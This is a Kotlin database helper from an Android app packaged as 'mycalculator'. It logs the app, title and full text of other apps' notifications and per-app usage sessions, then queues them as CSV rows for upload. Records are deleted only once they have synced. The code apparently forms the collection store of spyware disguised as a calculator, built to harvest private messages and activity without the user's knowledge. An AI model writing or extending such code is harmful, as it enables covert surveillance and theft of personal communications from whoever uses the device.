package com.android.mycalculator

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

// Upgraded to Version 4 for Usage Tracking!
class DatabaseHelper(context: Context) : SQLiteOpenHelper(context, "Notifs.db", null, 4) {
    
    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL("CREATE TABLE logs (id INTEGER PRIMARY KEY AUTOINCREMENT, app TEXT, title TEXT, content TEXT, logTime TEXT, timestampMs INTEGER, is_synced INTEGER DEFAULT 0)")
        
        // NEW: Usage Stats Table
        db.execSQL("CREATE TABLE usage_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, app_name TEXT, log_date TEXT, start_time TEXT, end_time TEXT, timestampMs INTEGER, is_synced INTEGER DEFAULT 0)")
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        db.execSQL("DROP TABLE IF EXISTS logs")
        db.execSQL("DROP TABLE IF EXISTS usage_logs")
        onCreate(db)
    }

    // ================= NOTIFICATIONS =================

    fun insertLog(app: String, title: String, content: String): Boolean {
        val db = this.writableDatabase
        val currentTimeMs = System.currentTimeMillis()

        val cursor = db.rawQuery(
            "SELECT COUNT(*) FROM logs WHERE app = ? AND title = ? AND content = ? AND (? - timestampMs) <= 2000",
            arrayOf(app, title, content, currentTimeMs.toString())
        )
        var isDuplicate = false
        if (cursor.moveToFirst()) if (cursor.getInt(0) > 0) isDuplicate = true
        cursor.close()

        if (isDuplicate) { db.close(); return false }

        val sdf = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault())
        val formattedLocalTime = sdf.format(Date(currentTimeMs))

        val values = ContentValues().apply {
            put("app", app); put("title", title); put("content", content)
            put("logTime", formattedLocalTime); put("timestampMs", currentTimeMs); put("is_synced", 0)
        }
        db.insert("logs", null, values)
        db.close()
        return true 
    }

    fun getAllLogs(): String {
        val db = this.readableDatabase
        val cursor = db.rawQuery("SELECT * FROM logs ORDER BY id DESC", null)
        var result = ""
        if (cursor.moveToFirst()) {
            do {
                val app = cursor.getString(cursor.getColumnIndexOrThrow("app"))
                val title = cursor.getString(cursor.getColumnIndexOrThrow("title"))
                val content = cursor.getString(cursor.getColumnIndexOrThrow("content"))
                val time = cursor.getString(cursor.getColumnIndexOrThrow("logTime"))
                result += "[$time]\nApp: $app\nTitle: $title\nText: $content\n\n-----------------\n\n"
            } while (cursor.moveToNext())
        }
        cursor.close(); db.close()
        return result
    }

    fun getUnsyncedLogs(): List<Pair<Int, String>> {
        val db = this.readableDatabase
        val cursor = db.rawQuery("SELECT * FROM logs WHERE is_synced = 0 ORDER BY id ASC", null)
        val unsyncedList = mutableListOf<Pair<Int, String>>()
        val deviceName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"

        if (cursor.moveToFirst()) {
            do {
                val id = cursor.getInt(cursor.getColumnIndexOrThrow("id"))
                val app = cursor.getString(cursor.getColumnIndexOrThrow("app"))?.replace("\"", "\"\"")?.replace(",", ";") ?: ""
                val title = cursor.getString(cursor.getColumnIndexOrThrow("title"))?.replace("\"", "\"\"")?.replace(",", ";") ?: ""
                val content = cursor.getString(cursor.getColumnIndexOrThrow("content"))?.replace("\"", "\"\"")?.replace(",", ";") ?: ""
                val time = cursor.getString(cursor.getColumnIndexOrThrow("logTime"))?.replace(",", ";") ?: ""
                val csvRow = "\"$deviceName\",\"$app\",\"$title\",\"$content\",\"$time\"\n"
                unsyncedList.add(Pair(id, csvRow))
            } while (cursor.moveToNext())
        }
        cursor.close(); db.close()
        return unsyncedList
    }

    // ================= USAGE LOGS =================

    fun insertUsageLog(device: String, appName: String, date: String, startTime: String, endTime: String, timestampMs: Long) {
        val db = this.writableDatabase
        
        // Prevent duplicate entries for the exact same session
        val cursor = db.rawQuery("SELECT COUNT(*) FROM usage_logs WHERE app_name = ? AND start_time = ? AND end_time = ?", arrayOf(appName, startTime, endTime))
        var isDuplicate = false
        if (cursor.moveToFirst()) if (cursor.getInt(0) > 0) isDuplicate = true
        cursor.close()

        if (!isDuplicate) {
            val values = ContentValues().apply {
                put("device", device); put("app_name", appName); put("log_date", date)
                put("start_time", startTime); put("end_time", endTime)
                put("timestampMs", timestampMs); put("is_synced", 0)
            }
            db.insert("usage_logs", null, values)
        }
        db.close()
    }

    fun getAllUsageLogs(): String {
        val db = this.readableDatabase
        val cursor = db.rawQuery("SELECT * FROM usage_logs ORDER BY timestampMs DESC", null)
        var result = ""
        if (cursor.moveToFirst()) {
            do {
                val app = cursor.getString(cursor.getColumnIndexOrThrow("app_name"))
                val date = cursor.getString(cursor.getColumnIndexOrThrow("log_date"))
                val start = cursor.getString(cursor.getColumnIndexOrThrow("start_time"))
                val end = cursor.getString(cursor.getColumnIndexOrThrow("end_time"))
                result += "[$date]\nApp: $app\nStarted: $start\nEnded: $end\n\n-----------------\n\n"
            } while (cursor.moveToNext())
        }
        cursor.close(); db.close()
        return result
    }

    fun getUnsyncedUsageLogs(): List<Pair<Int, String>> {
        val db = this.readableDatabase
        val cursor = db.rawQuery("SELECT * FROM usage_logs WHERE is_synced = 0 ORDER BY timestampMs ASC", null)
        val unsyncedList = mutableListOf<Pair<Int, String>>()

        if (cursor.moveToFirst()) {
            do {
                val id = cursor.getInt(cursor.getColumnIndexOrThrow("id"))
                val device = cursor.getString(cursor.getColumnIndexOrThrow("device"))?.replace("\"", "\"\"")?.replace(",", ";") ?: ""
                val app = cursor.getString(cursor.getColumnIndexOrThrow("app_name"))?.replace("\"", "\"\"")?.replace(",", ";") ?: ""
                val date = cursor.getString(cursor.getColumnIndexOrThrow("log_date"))?.replace(",", ";") ?: ""
                val start = cursor.getString(cursor.getColumnIndexOrThrow("start_time"))?.replace(",", ";") ?: ""
                val end = cursor.getString(cursor.getColumnIndexOrThrow("end_time"))?.replace(",", ";") ?: ""
                
                val csvRow = "\"$device\",\"$app\",\"$date\",\"$start\",\"$end\"\n"
                unsyncedList.add(Pair(id, csvRow))
            } while (cursor.moveToNext())
        }
        cursor.close(); db.close()
        return unsyncedList
    }

    // ================= SHARED SYNC & CLEANUP =================

    fun markAsSynced(ids: List<Int>, table: String = "logs") {
        val db = this.writableDatabase
        for (id in ids) {
            val values = ContentValues().apply { put("is_synced", 1) }
            db.update(table, values, "id=?", arrayOf(id.toString()))
        }
        db.close()
    }

    // FIXED: Only deletes logs older than 48 hours IF they have successfully synced
    fun deleteOldSyncedLogs() {
        val db = this.writableDatabase
        
        // 48 Hours * 60 Mins * 60 Secs * 1000 Milliseconds
        val fortyEightHoursAgoMs = System.currentTimeMillis() - (48L * 60 * 60 * 1000)
        
        try {
            // RESTORED: Added "AND is_synced = 1" back to the queries
            // This guarantees offline data is protected forever until it uploads.
            db.delete("logs", "timestampMs < ? AND is_synced = 1", arrayOf(fortyEightHoursAgoMs.toString()))
            db.delete("usage_logs", "timestampMs < ? AND is_synced = 1", arrayOf(fortyEightHoursAgoMs.toString()))
        } catch (e: Exception) { 
            e.printStackTrace() 
        } finally { 
            db.close() 
        }
    }
}
